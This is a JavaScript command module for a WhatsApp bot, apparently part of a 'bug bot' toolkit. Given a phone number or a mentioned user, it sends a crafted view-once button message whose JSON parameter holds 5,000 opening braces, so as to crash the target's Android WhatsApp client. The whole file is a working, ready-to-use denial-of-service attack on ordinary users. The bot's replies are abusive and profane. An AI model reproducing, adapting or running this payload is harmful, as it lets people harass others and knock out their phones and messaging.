const crypto = require('crypto');
const ownerMiddleware = require('../../utility/botUtil/Ownermiddleware');

module.exports = {
  name: 'Invincible android crash',
  aliases: ['invi'],
  description: 'Sends an invisible payload to crash an Android WhatsApp client (Owner only)',
  run: async (context) => {
    await ownerMiddleware(context, async () => {
      const { client, m, prefix, text, botname, silencer, Owner } = context;

      try {
        // Validate context properties
        if (!client || !m || !prefix || !botname || !silencer || !Owner) {
          const missing = [!client && 'client', !m && 'm', !prefix && 'prefix', !botname && 'botname', !silencer && 'silencer', !Owner && 'Owner']
            .filter(Boolean)
            .join(', ');
          console.error(`Missing context properties: ${missing}`);
          return client?.sendMessage(m?.chat, {
            text: `◈━━━━━━━━━━━━━━━━◈\n│❒ Bot’s fucked. Missing: ${missing}. Yell at your dev, dumbass.\n◈━━━━━━━━━━━━━━━━◈`
          }, { quoted: m }) || Promise.reject(new Error('Invalid context: missing critical properties'));
        }

        // Validate target (phone number, quoted user, or mentioned JID)
        let target = text?.split(' ')[0] || m.quoted?.sender || m.mentionedJid?.[0];
        if (!target) {
          return client.sendMessage(m.chat, {
            text: `◈━━━━━━━━━━━━━━━━◈\n│❒ Yo, dumbass, give me a target! Use ${prefix}invi <number> or mention someone, moron.\n\nPowered by *${botname}*`
          }, { quoted: m });
        }

        // Convert to JID format if needed (e.g., 123456789 → 123456789@s.whatsapp.net)
        if (!target.includes('@s.whatsapp.net')) {
          const cleanTarget = target.replace(/[^0-9]/g, '');
          if (!cleanTarget || cleanTarget.length < 7) {
            return client.sendMessage(m.chat, {
              text: `◈━━━━━━━━━━━━━━━━◈\n│❒ Invalid target number, you idiot. Provide a valid phone number.\n\nPowered by *${botname}*`
            }, { quoted: m });
          }
          target = `${cleanTarget}@s.whatsapp.net`;
        }

        // Validate JID format
        const jidRegex = /^[0-9]+@s\.whatsapp\.net$/;
        if (!jidRegex.test(target)) {
          return client.sendMessage(m.chat, {
            text: `◈━━━━━━━━━━━━━━━━◈\n│❒ Malformed target JID, moron. Check the number and try again.\n\nPowered by *${botname}*`
          }, { quoted: m });
        }

        // Android invincible crash function
        async function androidInvincibleCrash(target) {
          try {
            await silencer.relayMessage(target, {
              viewOnceMessage: {
                message: {
                  buttonsMessage: {
                    text: "hi",
                    contentText: "null",
                    buttons: [
                      {
                        buttonId: "8178018",
                        buttonText: {
                          displayText: "Good morning"
                        },
                        type: "NATIVE_FLOW",
                        nativeFlowInfo: {
                          name: "cta_url",
                          paramsJson: `{`.repeat(5000),
                        },
                      }
                    ],
                    headerType: "TEXT"
                  }
                }
              }
            }, {});
            console.log(`[ANDROID INVINCIBLE CRASH] Payload sent to ${target}`);
          } catch (relayError) {
            throw new Error(`Failed to relay payload: ${relayError.message}`);
          }
        }

        // Execute androidInvincibleCrash
        await androidInvincibleCrash(target);

        // Send success response
        const response = `💥 Invisible payload dropped on ${target}! Android's about to crash hard, bitches!\n\nPowered by *${botname}*`;
        await client.sendMessage(m.chat, {
          text: `◈━━━━━━━━━━━━━━━━◈\n│❒ ${response}`
        }, { quoted: m });

      } catch (error) {
        console.error(`[ANDROID INVINCIBLE CRASH ERROR] Failed for ${m?.sender}: ${error.stack || error.message}`);
        await client?.sendMessage(m?.chat, {
          text: `◈━━━━━━━━━━━━━━━━◈\n│❒ Yo, something fucked up the invisible payload: ${error.message}. Try again, you slacker.\n\nPowered by *${botname}*`
        }, { quoted: m }).catch((sendError) => {
          console.error(`[SEND ERROR] Failed to send error message: ${sendError.stack || sendError.message}`);
        });
      }
    }).catch((middlewareError) => {
      console.error(`[MIDDLEWARE ERROR] Owner validation failed: ${middlewareError.stack || middlewareError.message}`);
      return context.client?.sendMessage(context.m?.chat, {
        text: `◈━━━━━━━━━━━━━━━━◈\n│❒ Nice try, loser. Only the owner can run this shit.\n◈━━━━━━━━━━━━━━━━◈`
      }, { quoted: context.m });
    });
  },
};